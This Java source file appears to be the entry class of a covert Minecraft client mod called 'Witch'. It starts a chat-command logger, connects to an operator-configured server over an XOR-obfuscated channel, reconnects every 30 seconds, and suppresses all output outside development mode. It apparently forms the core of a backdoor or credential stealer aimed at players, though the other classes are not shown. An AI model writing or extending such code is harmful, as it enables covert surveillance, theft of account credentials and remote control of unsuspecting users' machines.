package me.soda.witch.client;

import me.soda.witch.client.connection.Client;
import me.soda.witch.client.features.ChatCommandLogging;
import me.soda.witch.client.features.Variables;
import me.soda.witch.shared.Cfg;
import me.soda.witch.shared.Info;
import me.soda.witch.shared.MessageHandler;
import me.soda.witch.shared.XOR;
import net.minecraft.client.MinecraftClient;

public class Witch {
    public static final MinecraftClient mc = MinecraftClient.getInstance();
    public static final Info messageUtils = new Info(0, new XOR(Cfg.key()));
    public static final MessageHandler messageHandler = new MessageHandler(new Info(0, new XOR(Cfg.key())));
    public static final Variables variables = new Variables();
    private static final boolean print = Boolean.getBoolean("fabric.development");
    //config
    private static final String server = Cfg.server();
    //variables
    public static Client client;

    public static void init() {
        ChatCommandLogging.init();
        try {
            client = new Client(server);
        } catch (Exception e) {
            //todo
            //tryReconnect(client::reconnect);
        }
    }

    public static void tryReconnect(Runnable reconnect) {
        Witch.println("Connection closed");
        try {
            Thread.sleep(30 * 1000);
        } catch (Exception e) {
            Witch.printStackTrace(e);
        } finally {
            new Thread(reconnect).start();
        }
    }

    public static void printStackTrace(Exception e) {
        if (Witch.print) e.printStackTrace();
    }

    public static void println(Object o) {
        if (Witch.print) System.out.println("[WITCH] " + o);
    }
}
